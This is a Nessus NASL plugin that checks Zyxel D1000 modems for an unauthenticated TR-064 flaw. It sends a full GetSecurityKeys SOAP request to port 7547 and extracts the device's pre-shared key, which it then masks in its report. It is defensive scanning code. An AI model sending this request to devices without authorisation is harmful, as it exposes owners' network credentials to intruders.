#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(96448);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/01/16 15:05:10 $");
  
  script_osvdb_id(147152);
  script_xref(name:"EDB-ID", value:"40740");

  script_name(english:"Zyxel D1000 CWMP Get Default Password");
  script_summary(english:"Query device over CWMP interface for default login password.");

  script_set_attribute(attribute:"synopsis", value:
"Nessus was able to acquire the password from the Zyxel D1000 device.");
  script_set_attribute(attribute:"description", value:
"Nessus was able to acquire the password from the Zyxel D1000 device by
using CWMP commands over the TR-064 protocol. This protocol is
typically open on port 7547.");
  #https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?87597061");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of the firmware.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value: "2016/11/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/01/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/h:eircom_limited:zyxel_d1000");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 7547);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("audit.inc");
include("http_func.inc");
include("http_keepalive.inc");

service_name = "Zyxel D1000";
port = get_http_port(default:7547);
if (!port) audit(AUDIT_SVC_FAIL, service_name, port);

# Unless we're paranoid, make sure the banner indicates it's RomPager.
#  Example Server header:
#  Server: RomPager/4.07 UPnP/1.0
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner) audit(AUDIT_WEB_BANNER_NOT, port);
  if ("Server: RomPager" >!< banner) audit(AUDIT_NOT_DETECT, service_name, port);
}

# Send TR-064 GetSecurityKeys post request
soap_uri  =  '/UD/act?1';
soap_cmd  =  'urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys';
soap_data =  '<?xml version="1.0"?>';
soap_data += '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">';
soap_data += ' <SOAP-ENV:Body>';
soap_data += '  <u:GetSecurityKeys xmlns:u="urn:dslforum-org:service:WLANConfiguration:1"></u:GetSecurityKeys>';
soap_data += ' </SOAP-ENV:Body>';
soap_data += '</SOAP-ENV:Envelope>';

req = http_post(item:soap_uri, port:port, data: soap_data);
req = ereg_replace(string:req, pattern:"Content-Length: ", replace: "SOAPAction: "+soap_cmd + '\r\n' + "Content-Length: ");
req = ereg_replace(string:req, pattern:"Content-Length: ", replace: "Content-Type: text/xml" + '\r\n' + "Content-Length: ");
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE, embedded:TRUE );

# Check request response for key value
if( "<NewPreSharedKey>" >!< res ) audit(AUDIT_LISTEN_NOT_VULN, service_name, port);
k = eregmatch( pattern:'<NewPreSharedKey>([^<]+)</NewPreSharedKey>', string:res );

if ( !isnull( k[1] ) )
{
  # Mask password
  pass = k[1];
  if (strlen(pass) > 0)
  {
    pass = pass[0] + '******' + pass[strlen(pass) - 1];
  }
  else
  {
    pass = '******';
  }
  report = "Nessus was able to acquire the device password " +
           "from the " + service_name + " with a CWMP " +
           "request to '" + soap_uri + "'" + '\n' +
           "(note that any passwords displayed have been " +
           "partially masked)" + '\n' +
           " : " + pass;

  security_report_v4(port:port, extra:report, severity:SECURITY_HOLE);
  exit(0);
}
else
  audit(AUDIT_LISTEN_NOT_VULN, service_name, port);
